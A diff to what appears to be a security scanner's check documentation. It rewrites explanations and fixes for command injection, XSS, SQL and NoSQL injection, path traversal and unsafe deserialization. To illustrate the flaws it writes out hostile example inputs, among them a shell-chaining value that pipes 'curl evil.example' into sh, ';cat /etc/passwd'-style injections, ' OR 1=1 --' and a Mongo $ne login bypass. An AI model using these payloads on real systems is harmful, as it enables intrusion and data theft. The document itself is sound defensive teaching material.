@@ -21,10 +21,10 @@ in this file and quote the title, description, and fix steps.
 - **Total checks:** 804
 - **Categories:** 18 (active-probes, api, client-side, code, configuration, content, cookies, dns, email, headers, host-validation, information-disclosure, reputation, secrets-extended, ssl, supply-chain, tls, vibe-code)
 - **By severity:**
-  - medium: 222
-  - high: 195
-  - low: 186
-  - info: 101
+  - medium: 221
+  - high: 192
+  - low: 188
+  - info: 103
   - critical: 100
 - **By type:**
   - body-pattern: 465
@@ -3252,9 +3252,9 @@ ws.onmessage = (event) => {
 
 An HTTPS page contains a form that submits data to an HTTP endpoint.
 
-**Risk:** User credentials and form inputs are transmitted in plaintext.
+**Risk:** Everything in the form, passwords included, crosses the network in plaintext. Anyone on the same Wi-Fi, an ISP or a compromised router can read or change it, even though the page showed a padlock.
 
-**Why it matters:** When a secure page sends form data to an insecure endpoint, all submitted data travels unencrypted.
+**Why it matters:** The page being HTTPS does not protect the submit: the browser sends to whatever the action attribute says. Confirm by reading the form's action in the page source. A redirect from that http:// endpoint to HTTPS does not fix it, because the POST body has already travelled in the clear on the first request.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/319.html
@@ -3263,7 +3263,7 @@ An HTTPS page contains a form that submits data to an HTTP endpoint.
 **Fix:**
 - Change all form action URLs to use HTTPS.
 - Use relative URLs so forms inherit the page protocol.
-- Implement HSTS.
+- Send HSTS so the browser upgrades any http:// request for the host before it leaves the machine.
 - **Fix** (html):
 ```html
 <!-- BAD -->
@@ -3302,20 +3302,21 @@ function safeMerge(target, source) {
 ### `command-injection` [code / high / body-pattern]
 **Potential Command Injection Vectors**
 
-Code patterns that execute system commands, potentially vulnerable to command injection.
+Code in the response calls exec, spawn, execSync, system or popen with a value concatenated from a request object (req., params., query. and similar).
 
-**Risk:** Command injection allows attackers to execute arbitrary system commands.
+**Risk:** If this runs on the server, whoever sends that parameter runs commands as the web process: reading files and environment variables, downloading a second stage, moving on to the internal network. A public route needs no login for any of it.
 
-**Why it matters:** Executing system commands with user-controlled input is extremely dangerous.
+**Why it matters:** The check matches the code, not a live exploit. That code being in a response at all usually means source or a source map is being served, so find out why. To confirm the bug, trace the value back to the request and try a harmless payload on a test system, such as ";sleep 5", and see whether the response is delayed. Shell metacharacters are only half of it: with no shell, input can still add flags to the program being called.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/78.html
 - https://owasp.org/Top10/A03_2021-Injection/
 
 **Fix:**
-- Never pass user input to system command functions.
-- Use language-native APIs instead of shell commands.
-- Run with minimal privileges.
+- Replace the subprocess with a library call where one exists: fs.unlink rather than rm.
+- Where a subprocess is needed, use execFile or spawn with an argument array and no shell.
+- Validate each value against an allowlist and put -- before user-supplied arguments.
+- Run the process as a user that can reach only what it needs.
 - **Safe alternative** (typescript):
 ```typescript
 // BAD: exec(`rm <value>`);
@@ -3358,11 +3359,11 @@ if (payload.role === "admin") grantAccess();
 ### `path-traversal` [code / high / body-pattern]
 **Potential Path Traversal Vulnerability**
 
-File operations with user-controlled paths that could allow directory traversal.
+Server code in the response passes a request value into readFile, readFileSync or createReadStream through concatenation or a template string.
 
-**Risk:** Path traversal allows attackers to read arbitrary files on the server.
+**Risk:** A value such as ../../etc/passwd walks out of the intended directory, so anyone can read what the server process can: config files, private keys, .env, source code.
 
-**Why it matters:** Path traversal occurs when user input is used to construct file paths without validation.
+**Why it matters:** Filtering for ../ alone tends to fail: input can be URL encoded, doubled as ....//, or absolute, and backslashes work on Windows. The reliable test runs on the final path: resolve it against a fixed base and check that the result is still inside. path.join does not help, because it normalizes ../ rather than blocking it. Code like this in a public response also means source is being served, so look at how it got there.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/22.html
@@ -3384,11 +3385,11 @@ if (!safePath.startsWith(baseDir)) throw new Error('Invalid path');
 ### `insecure-auth` [code / high / combined]
 **Insecure Authentication Mechanisms Detected**
 
-Authentication security issues that could compromise user sessions.
+The response contains a Basic Authorization header, a password in a URL, or a username and password written as a pair.
 
 **Risk:** Weak authentication allows credential theft, session hijacking, or authentication bypass.
 
-**Why it matters:** Secure authentication requires proper cookie flags, token handling in headers, and avoiding Basic authentication.
+**Why it matters:** Each of those hands a usable login to anyone reading the response. Basic credentials are base64 of user:password and never expire, URLs get written to logs and history, and a hardcoded pair works until someone remembers to change it. Translation strings such as password: "Password" are filtered out, so a hit here is generally a real value. Find which account it belongs to and change that password before you clean up the code.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/287.html
@@ -3406,11 +3407,11 @@ response.headers.set('Set-Cookie', `sessionId=<value>; HttpOnly; Secure; SameSit
 ### `insecure-deserialization` [code / high / body-pattern]
 **Potential Insecure Deserialization**
 
-Deserialization operations on potentially untrusted data.
+Code in the response passes request data to PHP unserialize, Python pickle.loads or yaml.load.
 
-**Risk:** Insecure deserialization can allow remote code execution.
+**Risk:** These parsers can build arbitrary objects, and building them is enough to run code: a crafted cookie or upload becomes remote code execution under the web server's account.
 
-**Why it matters:** Deserializing untrusted data can instantiate arbitrary objects or execute code.
+**Why it matters:** The format decides the risk. JSON can only make plain data, so it cannot run anything. Pickle, PHP serialize and unrestricted YAML can name classes and functions, and the parser acts on them before your code gets a chance to validate the result. Signing the payload with an HMAC only helps if the key stays secret and the signature is checked first.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
@@ -3514,14 +3515,14 @@ element.replaceWith(text);
 // Or create structured elements programmatically
 ```
 
-### `document-write-sink` [code / high / body-pattern]
+### `document-write-sink` [code / medium / body-pattern]
 **document.write DOM XSS Sink**
 
-document.write() call detected.
+A document.write() or writeln() call builds its argument from concatenation, JSON.parse, location, document.referrer, document.URL or window.name.
 
-**Risk:** Can completely overwrite page content with attacker-controlled HTML.
+**Risk:** If any of those values can be set by a visitor or a link, the HTML parser runs it as markup, which is DOM XSS. The check sees the shape of the call, not a proven path from input.
 
-**Why it matters:** document.write is a powerful and dangerous DOM manipulation method.
+**Why it matters:** document.write feeds the parser directly with no escaping step. To confirm, find where the argument comes from: a constant built by concatenation is safe, while location.search or window.name is not. Browsers may also ignore scripts injected this way on slow connections, so it costs you reliability even where it is not a security bug.
 
 **References:**
 - https://owasp.org/www-community/attacks/xss/
@@ -3529,7 +3530,9 @@ document.write() call detected.
 - https://owasp.org/Top10/A03_2021-Injection/
 
 **Fix:**
-- Replace with appendChild or insertAdjacentHTML with sanitization.
+- Replace it with createElement and textContent.
+- Where you must insert HTML, sanitize it with DOMPurify first.
+- Load third-party tags with an async script element instead of writing them into the page.
 - **Never use document.write with user content** (javascript):
 ```javascript
 // BAD
@@ -3603,18 +3606,20 @@ element.setAttribute("href", url.href);
 ### `path-traversal-indicators` [code / high / body-pattern]
 **Path Traversal Indicators**
 
-Path traversal sequences in URL parameters.
+The response contains a URL whose file, path, dir, folder or include parameter holds ../ or its encoded form ..%2F.
 
-**Risk:** Could access files outside intended directory.
+**Risk:** If that parameter reaches a file read on the server, ../ walks out of the intended folder. Attackers go straight for /etc/passwd, application config, .env files and private keys, and an include parameter can run the file it loads, which turns a read into code execution.
 
-**Why it matters:** ../sequences can escape the web root to read sensitive files.
+**Why it matters:** A link carrying ../ usually means an app builds file paths from request values. Sometimes it is only a scanner's or attacker's URL reflected back into the page. To confirm, request the same endpoint on a test system with file=../../../etc/passwd and try the encoded forms too. Filters that remove ../ once are defeated by ....// and double encoding, so the check has to run on the resolved path.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/22.html
 - https://owasp.org/Top10/A01_2021-Broken_Access_Control/
 
 **Fix:**
-- Validate paths, use basename(), never concatenate user input.
+- Map user input to an allowlist of known files or IDs instead of accepting a path.
+- Otherwise resolve the path against a fixed base directory and reject anything that lands outside it.
+- Reject null bytes, and decode input fully before checking it.
 - **Block path traversal sequences** (typescript):
 ```typescript
 function sanitizePath(input: string): string {
@@ -3633,18 +3638,20 @@ function sanitizePath(input: string): string {
 ### `ssti-indicators` [code / high / body-pattern]
 **Template Injection Indicators**
 
-Template syntax detected in output.
+A literal {{7*7}} style expression (digits multiplied inside double curly braces) appears in the output.
 
-**Risk:** Server-Side Template Injection can lead to RCE.
+**Risk:** If a server-side template engine evaluates user input, the template language becomes the attack. Jinja2 and Twig expressions can reach Python or PHP internals, and from there read configuration or run commands.
 
-**Why it matters:** Unescaped template expressions can execute arbitrary code.
+**Why it matters:** {{7*7}} is the standard probe for template injection. Seeing it unrendered in a page is not proof of a bug: it usually means someone tried it and the app stored the text safely. The vulnerable result looks different, because the page shows 49 where the probe was. To confirm, submit {{7*6}} through the field that produced this and look for 42. Angular and Vue evaluate these in the browser too, which is XSS rather than server compromise.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/1336.html
 - https://owasp.org/Top10/A03_2021-Injection/
 
 **Fix:**
-- Escape all user input before template rendering.
+- Pass user input to templates as data, never as part of the template source.
+- Use a sandboxed engine mode for any template users are allowed to edit.
+- Find what stored this expression and check your logs for other payloads from the same source.
 - **Never pass user input directly to template engines** (typescript):
 ```typescript
 // BAD: user controls the template string
@@ -3685,18 +3692,20 @@ if (!SAFE_PATTERN.test(userInput)) {
 ### `function-constructor` [code / high / body-pattern]
 **Function Constructor Usage**
 
-new Function() usage detected.
+Inline script calls new Function() to compile a string into code.
 
-**Risk:** Similar to eval(), can execute arbitrary code.
+**Risk:** The code runs in global scope with the page's full access. If the string includes anything from a URL, storage or a message, that is script injection. It also forces a CSP to allow 'unsafe-eval'.
 
-**Why it matters:** Function constructor creates functions from strings.
+**Why it matters:** new Function is a close relative of eval: it cannot see local variables, but parsing and running arbitrary text carries the same risk. A constant string is harmless for security and still costs you a strict CSP. Template compilers and older bundles are common legitimate sources, so check whether the code is yours and then whether its argument is ever dynamic.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/94.html
 - https://owasp.org/Top10/A03_2021-Injection/
 
 **Fix:**
-- Avoid Function constructor, use direct function definitions.
+- Replace it with a real function, or a lookup table of functions keyed by name.
+- If a library is the source, switch to its CSP-safe build.
+- Once none remain, remove 'unsafe-eval' from your Content-Security-Policy.
 - **Avoid new Function() with user input** (javascript):
 ```javascript
 // BAD: equivalent to eval()
@@ -3719,7 +3728,7 @@ child_process.exec(cmd) always routes cmd through /bin/sh (or cmd.exe), so exec(
 
 **Risk:** Attacker-controlled input concatenated into exec() gains full shell-injection capability, leading to RCE on the host.
 
-**Why it matters:** The code-cmdi-exec check verifies that the server does not expose the cmdi-exec weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** exec hands one string to a shell, and the shell decides where one command ends and the next begins. A value like "a; curl evil.example | sh" stops being data the moment it is concatenated in, and it runs as the Node process, with that account's files, environment variables and database credentials. Check first that the match really is child_process.exec, since RegExp objects have an exec method too. If it is, the response is also handing out server code, which shows attackers the exact call to aim at.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/78.html
@@ -3943,14 +3952,18 @@ const api = axios.create({
 
 setInterval('code', 1000) is implicitly eval(). Pass a function reference instead.
 
-**Risk:** Use setInterval(function() {}, 1000) instead of setInterval('...', 1000)
+**Risk:** A string passed to setInterval or setTimeout is compiled and run the way eval runs it. If the string is built from input, that is script injection, and it repeats on every tick of the timer.
+
+**Why it matters:** Browsers kept this legacy form for compatibility, and the string runs in global scope. Beyond the injection risk it also blocks a strict CSP, which refuses to compile the string without 'unsafe-eval'. An arrow function does the same work with neither problem. The check also fires when the first argument is concatenated, so look at what builds it.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/94.html
 - https://owasp.org/Top10/A03_2021-Injection/
 
 **Fix:**
-- Use setInterval(function() {}, 1000) instead of setInterval('...', 1000)
+- Pass a function: setInterval(() => tick(), 1000).
+- Pass arguments after the delay rather than concatenating them into a string.
+- Once none remain, remove 'unsafe-eval' from your Content-Security-Policy.
 - **Pass function reference to setInterval** (javascript):
 ```javascript
 // BAD: string form is eval()
@@ -4088,9 +4101,11 @@ window.open("https://example.com", "_blank", "noopener,noreferrer");
 ### `code-jquery-html` [code / high / header]
 **jQuery .html() with user input**
 
-$el.html(userInput) executes arbitrary HTML. Always escape or use .text().
+$el.html(value) parses its argument as HTML and can run scripts it contains. This check flags calls where the argument is not a plain string literal.
 
-**Risk:** Use .text() or escape user input via a DOMPurify-like library
+**Risk:** Whoever controls the value can run JavaScript in your origin. jQuery also runs script elements passed to .html(), where plain innerHTML would leave them inert.
+
+**Why it matters:** Look at the argument. A variable built from fixed markup is fine. Anything fed by an AJAX response containing user content, a URL parameter or a form value is DOM XSS. Older jQuery adds its own trouble, since versions before 3.5 could turn sanitized HTML back into live markup in its manipulation methods.
 
 **References:**
 - https://owasp.org/www-community/attacks/xss/
@@ -4098,7 +4113,9 @@ $el.html(userInput) executes arbitrary HTML. Always escape or use .text().
 - https://owasp.org/Top10/A03_2021-Injection/
 
 **Fix:**
-- Use .text() or escape user input via a DOMPurify-like library
+- Use .text() for anything that should be plain text.
+- Where HTML is required, pass it through DOMPurify first.
+- Upgrade jQuery to 3.5 or later.
 - **Avoid .html() with user content in jQuery** (javascript):
 ```javascript
 // BAD: .html() with user input executes scripts
@@ -4296,7 +4313,7 @@ insertAdjacentElement splices a live DOM node into the document. When the node i
 
 **Risk:** Attacker-controlled DOM nodes can execute JavaScript in the page origin without HTML-parser sanitizers firing.
 
-**Why it matters:** The code-xss-insertadjacentelement check verifies that the server does not expose the xss-insertadjacentelement weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** insertAdjacentElement takes a node that already exists, so an HTML sanitizer that works on strings never sees it. The danger is in how that node was built: an anchor whose href came from a query parameter, or an element cloned out of user-supplied markup with an onerror attribute still attached. Once inserted it runs with the page's cookies, tokens and DOM. Trace where the element is created, not where it is inserted.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/API/Element/insertAdjacentElement
@@ -4324,7 +4341,7 @@ Range.createContextualFragment(fragString) parses HTML and returns a DocumentFra
 
 **Risk:** Attacker-controlled HTML strings execute JavaScript in the page origin the moment the fragment is inserted.
 
-**Why it matters:** The code-xss-createcontextualfragment check verifies that the server does not expose the xss-createcontextualfragment weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** This API is unusual in that it makes scripts run. A <script> inside a fragment from createContextualFragment executes when the fragment is inserted, where the same markup assigned to innerHTML stays inert. That makes it one of the more dangerous sinks to feed with anything a visitor can influence. An injected script can read whatever the page can reach, including tokens in browser storage and everything on screen.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/API/Range/createContextualFragment
@@ -4352,7 +4369,7 @@ Combining document.write with JSON.parse(userInput) reflects attacker-controlled
 
 **Risk:** document.write runs synchronously during parse; injected scripts execute in the page origin and persist.
 
-**Why it matters:** The code-xss-documentwrite-jsonparse check verifies that the server does not expose the xss-documentwrite-jsonparse weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** JSON.parse gives the comfortable impression that data has been validated, but a JSON string value can hold any markup at all. Written with document.write it goes straight into the HTML parser while the page is loading, so a value such as <img src=x onerror=...> runs immediately. The usual sources are JSON from a URL fragment, from localStorage, or from an API that echoes user content.
 
 **References:**
 - https://owasp.org/www-community/attacks/xss/
@@ -4379,7 +4396,7 @@ dangerouslySetInnerHTML={{ __html: buildHtml(userInput) }} constructs the HTML s
 
 **Risk:** Computed or concatenated HTML strings can smuggle <script>, <iframe>, or event handlers past component-level sanitizers.
 
-**Why it matters:** The code-xss-dangerouslysetinnerhtml-dynamic check verifies that the server does not expose the xss-dangerouslysetinnerhtml-dynamic weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** React escapes everything by default and dangerouslySetInnerHTML is the one opt-out. This check flags the case where the value is computed at render, by a function call or concatenation, so nobody can tell from the call site whether a sanitizer ran last. Sanitizing the pieces is not enough, because two harmless fragments can join into a live tag. The finished string has to be sanitized right where it is handed to React.
 
 **References:**
 - https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html
@@ -4408,7 +4425,7 @@ function DynamicContent({ html }: { html: string }) {
 
 **Risk:** Attacker-controlled HTML executes JavaScript in the Vue app origin.
 
-**Why it matters:** The code-xss-vue-v-html-dynamic check verifies that the server does not expose the xss-vue-v-html-dynamic weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Vue's double-curly interpolation escapes HTML and v-html does not. An expression in the binding, rather than a plain trusted constant, means the output is assembled at render time and can include anything its inputs contain. Injected markup runs in the app's origin with access to its state and any token kept in browser storage. Vue's own documentation says to use v-html only on trusted content, never on user-provided content.
 
 **References:**
 - https://vuejs.org/api/built-in-directives.html#v-html
@@ -4437,7 +4454,7 @@ Calling bypassSecurityTrustHtml(userInput) or bypassSecurityTrustScript(userInpu
 
 **Risk:** Attacker-controlled HTML or URL is rendered as-is, enabling stored XSS or javascript: navigation.
 
-**Why it matters:** The code-xss-angular-bypass-dynamic check verifies that the server does not expose the xss-angular-bypass-dynamic weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Angular sanitizes bound values by default, and the bypassSecurityTrust methods are how code tells it to stop. Each call is a promise that a person checked the value. When the argument is derived from input nobody did, and Angular renders it unchanged: HTML can carry event handlers and a URL can be javascript:. Searching the codebase for these calls should return a short list of constants, and anything else on that list needs a sanitizer in front of it.
 
 **References:**
 - https://angular.dev/api/core/DomSanitizer
@@ -4469,7 +4486,7 @@ new DOMParser().parseFromString(userInput, 'text/html') parses arbitrary HTML in
 
 **Risk:** Scripts parsed via DOMParser can survive adoption into the host document and execute.
 
-**Why it matters:** The code-xss-domparser-parsefromstring check verifies that the server does not expose the xss-domparser-parsefromstring weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** parseFromString on its own is safe: nothing runs inside the parsed document, which is why it is often used to inspect HTML. The risk starts when nodes leave that inert document. Code that imports them into the live page, or reads innerHTML back out and assigns it elsewhere, carries event-handler attributes along, and those fire once the element is live. Confirm whether any parsed node, or its serialized HTML, ever reaches the real DOM.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/API/DOMParser/parseFromString
@@ -4498,7 +4515,7 @@ spawn(cmd, { shell: true }) or spawn("sh -c " + cmd) re-routes the command throu
 
 **Risk:** Attacker-controlled arguments gain full shell-injection capability, leading to RCE on the host.
 
-**Why it matters:** The code-cmdi-spawn-shell-true check verifies that the server does not expose the cmdi-spawn-shell-true weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** spawn is the safe way to start a process because each argument stays a separate value. shell: true throws that away: Node joins the arguments into one string and gives it to a shell, so a single semicolon or a $(...) in any argument starts a new command. The option is often added for Windows .cmd support or for globs and then left in place. The command runs with the Node process's credentials and file access.
 
 **References:**
 - https://nodejs.org/api/child_process.html#child_processspawncommand-args-options
@@ -4524,11 +4541,11 @@ spawn("convert", ["-resize", "100x100", validatedInputPath, outputPath], {
 ### `code-cmdi-os-exec` [code / critical / body-pattern]
 **os.exec / os.system / os.popen usage**
 
-Python's os.system, os.exec*, and os.popen pass their string argument to the shell. Any user-controlled portion executes as a shell command.
+Python's os.system and os.popen pass their string to the shell, and os.exec* replaces the process with whatever program and arguments it is given. Any user-controlled portion decides what runs.
 
 **Risk:** Attacker can chain arbitrary shell commands and read or destroy server files.
 
-**Why it matters:** The code-cmdi-os-exec check verifies that the server does not expose the cmdi-os-exec weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** os.system and os.popen hand a single string to /bin/sh, so anything concatenated into it can contain shell syntax: a filename of "x; cat /etc/passwd" is enough. The os.exec family has no shell, but it is still dangerous when input picks the program or its flags. Whatever runs keeps the web app's user, files and secrets, so the first things an attacker reads are environment variables and application config.
 
 **References:**
 - https://docs.python.org/3/library/os.html#os.system
@@ -4560,7 +4577,7 @@ Patterns like os.system("/bin/sh -c '" + userInput + "'") or exec("sh -c " + use
 
 **Risk:** Concatenated shell strings let attackers break out of quotes and execute arbitrary commands.
 
-**Why it matters:** The code-cmdi-bin-sh-concat check verifies that the server does not expose the cmdi-bin-sh-concat weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Calling sh -c with a built string means the shell parses your quoting and the attacker's input together. Wrapping the value in single quotes does not help, because a single quote in the input closes yours and whatever follows runs as a command. Code like this usually reached for a shell to get pipes or redirects, and each of those can be done in the host language without one.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/78.html
@@ -4588,7 +4605,7 @@ subprocess.Popen(builtString, shell=True) and os.popen(builtString) both run the
 
 **Risk:** Shell injection through Popen/popen gives the attacker a shell on the host.
 
-**Why it matters:** The code-cmdi-popen check verifies that the server does not expose the cmdi-popen weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** subprocess.Popen is safe with a list of arguments and unsafe the moment shell=True meets a formatted string, because /bin/sh then parses the result. os.popen has no list form at all and always uses a shell. The classic case is a value placed into an otherwise fixed command, such as a hostname for ping: "8.8.8.8; id" runs both. Output often goes back to the caller, which makes reading files easy.
 
 **References:**
 - https://docs.python.org/3/library/subprocess.html#subprocess.Popen
@@ -4614,7 +4631,7 @@ spawn("git " + userArg) or execFile(`tool ${userArg}`) builds an argument string
 
 **Risk:** Argument injection lets attackers invoke unintended subcommands, read arbitrary files, or trigger built-in shell escapes.
 
-**Why it matters:** The code-cmdi-process-spawn check verifies that the server does not expose the cmdi-process-spawn weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** execFile and spawn only avoid a shell when the program and each argument are passed separately. Code that builds one command string has to split it on spaces or enable a shell to make it work, and then input can add its own flags: --upload-pack on git, -o on a compiler. That is argument injection, where the program is yours and the options are the attacker's, and it reaches file writes or code execution without a single shell metacharacter.
 
 **References:**
 - https://nodejs.org/api/child_process.html#child_processspawncommand-args-options
@@ -4641,7 +4658,7 @@ MongoDB queries of the form { $where: "this.field == '" + userInput + "'" } or {
 
 **Risk:** Attacker can run arbitrary JavaScript on the MongoDB server, leaking documents and bypassing authentication.
 
-**Why it matters:** The code-sqli-mongodb-where check verifies that the server does not expose the sqli-mongodb-where weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** $where is the MongoDB operator that executes JavaScript inside the database, once per document. A value concatenated into it is code, so "' || true || '" returns the whole collection and a sleep() call gives a timing oracle for reading fields one character at a time. Standard operators such as $eq take typed values and offer nothing to escape from, which is why $where should not appear near request data at all.
 
 **References:**
 - https://www.mongodb.com/docs/manual/reference/operator/query/where/
@@ -4668,7 +4685,7 @@ Building a MongoDB query with { field: { $regex: userInput } } or new RegExp(use
 
 **Risk:** Wildcard or pathological regex patterns expose every document or stall the server.
 
-**Why it matters:** The code-sqli-mongodb-regex check verifies that the server does not expose the sqli-mongodb-regex weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** A $regex built from input has two separate problems. Sending .* matches everything the filter was meant to narrow, which turns a lookup by name or email into a dump of the collection. A nested quantifier such as (a+)+$ makes the database burn CPU on each document, so one request can slow every other query on that server. Escaping the input turns the pattern back into literal text and closes both.
 
 **References:**
 - https://www.mongodb.com/docs/manual/reference/operator/query/regex/
@@ -4695,7 +4712,7 @@ db.query("SELECT * FROM users WHERE id = '" + userId + "'") or knex.raw(`SELECT 
 
 **Risk:** Classic SQL injection: data exfiltration, authentication bypass, and potentially full RCE on the database server.
 
-**Why it matters:** The code-sqli-raw-query-string check verifies that the server does not expose the sqli-raw-query-string weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Concatenation puts a value into the SQL text before the database has parsed it, so a quote in the value ends the string and the rest is read as SQL. "' OR 1=1 --" gets past a login check, and a UNION SELECT returns rows from any table the connection can read: password hashes, tokens, other customers' records. With a placeholder the statement is parsed first, and the value can never become syntax.
 
 **References:**
 - https://owasp.org/www-community/attacks/SQL_Injection
@@ -4725,7 +4742,7 @@ Tag-less template literals like pool.query(`SELECT * FROM t WHERE id = ${id}`) i
 
 **Risk:** Template-literal SQL injection exposes all rows the caller can see and can pivot to RCE on the database host.
 
-**Why it matters:** The code-sqli-template-literal-query check verifies that the server does not expose the sqli-template-literal-query weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** A backtick string looks like a parameterized query and behaves like concatenation: JavaScript fills in the value before the driver sees anything, so pool.query receives one finished string. It reads as tidy code and survives reviews for that reason. Only a tagged template, such as the sql helper in postgres.js or Prisma's $queryRaw, receives the parts separately and can turn them into bind parameters.
 
 **References:**
 - https://github.com/Poordeveloper/node-sql-template-tag
@@ -4751,7 +4768,7 @@ Model.find(JSON.parse(req.body)) passes a user-supplied object directly into a M
 
 **Risk:** Attacker injects NoSQL operators to bypass filters, leak other users' documents, or trigger $where JavaScript.
 
-**Why it matters:** The code-sqli-mongoose-find-user check verifies that the server does not expose the sqli-mongoose-find-user weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Passing a parsed request body to find() lets the client write the query rather than fill in a value. { "password": { "$ne": null } } matches every account, and a login that runs findOne on the submitted fields accepts that as a correct password. Express body parsers build these nested objects from ordinary form fields too, so this is not limited to JSON APIs. Cast each field to the type you expect before it reaches the query.
 
 **References:**
 - https://www.npmjs.com/package/express-mongo-sanitize
@@ -4776,7 +4793,7 @@ Sequelize.literal(userInput) or Sequelize.fn('CONCAT', userInput, 'x') interpola
 
 **Risk:** SQL injection via Sequelize.literal breaks parameterized query boundaries and can exfiltrate the entire database.
 
-**Why it matters:** The code-sqli-sequelize-literal check verifies that the server does not expose the sqli-sequelize-literal weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Sequelize parameterizes ordinary where clauses, and Sequelize.literal exists to opt out: its argument is pasted into the SQL as written, so anything dynamic inside it is injectable even though the rest of the query looks like safe ORM code. It is commonly reached for in ORDER BY, where bind parameters cannot stand in for column names. That case needs an allowlist of column names, not escaping.
 
 **References:**
 - https://sequelize.org/docs/v6/core-concepts/raw-queries/
@@ -4804,7 +4821,7 @@ yaml.load(input) uses the unsafe Loader by default and instantiates arbitrary Py
 
 **Risk:** Crafted YAML can execute arbitrary Python during parsing, leading to full RCE on the host.
 
-**Why it matters:** The code-deser-yaml-load check verifies that the server does not expose the deser-yaml-load weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** YAML tags can ask the parser to construct objects, and PyYAML's unsafe loaders, yaml.Loader and yaml.UnsafeLoader, honor tags such as !!python/object/apply:os.system, which calls the function while the document is being parsed. Validating the result afterwards is too late, because the code already ran. PyYAML 6 made the Loader argument mandatory to force this choice, but yaml.load(data, Loader=yaml.Loader) and older installs are still dangerous.
 
 **References:**
 - https://pyyaml.org/wiki/PyYAMLDocumentation
@@ -4833,7 +4850,7 @@ pickle.loads(untrusted_bytes) reconstructs arbitrary Python objects and executes
 
 **Risk:** Untrusted pickle data triggers arbitrary code execution in the Python interpreter.
 
-**Why it matters:** The code-deser-pickle-loads check verifies that the server does not expose the deser-pickle-loads weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** A pickle is a small program for a stack machine rather than a data format. Its REDUCE opcode calls any importable function with any arguments, so a crafted payload simply says to call os.system with a given string, and pickle.loads does that before your code sees a result. Python's own documentation warns never to unpickle untrusted data. The usual exposure is a cookie, a cache value in a shared Redis, or an uploaded model file.
 
 **References:**
 - https://docs.python.org/3/library/pickle.html
@@ -4866,7 +4883,7 @@ Patterns like eval(atob(payload)) or eval(Buffer.from(payload,'base64').toString
 
 **Risk:** Encoded eval() bypasses naive content filters and runs arbitrary JavaScript in the page or server.
 
-**Why it matters:** The code-deser-base64-eval check verifies that the server does not expose the deser-base64-eval weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Base64 and eval together are the signature of either a loader someone wrote in a hurry or a payload someone else planted, and the first thing to find out is which. Legitimate code rarely needs this. If the string arrives from a request or from storage, it is remote code execution in the browser or on the server. If it is hardcoded in a file you did not write, treat the site as possibly compromised and decode it to see what it does.
 
 **References:**
 - https://owasp.org/www-community/attacks/Code_Injection
@@ -4892,7 +4909,7 @@ new Function('return ' + JSON.parse(input)) or new Function(JSON.parse(input).bo
 
 **Risk:** Function constructor evaluates attacker-controlled source, enabling arbitrary code execution.
 
-**Why it matters:** The code-deser-jsonparse-newfunction check verifies that the server does not expose the deser-jsonparse-newfunction weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** new Function compiles a string into code just as eval does. Running the string through JSON.parse first only proves it was valid JSON, and a JSON string can hold any source text at all. This tends to appear in formula features, rule engines and plugin systems that store logic as data. Whoever can write that data can then run code in whichever process evaluates it, browser or server.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function
@@ -4914,11 +4931,11 @@ const data = JSON.parse(jsonString);
 ### `code-deser-node-serialize` [code / critical / body-pattern]
 **node-serialize deserialize()**
 
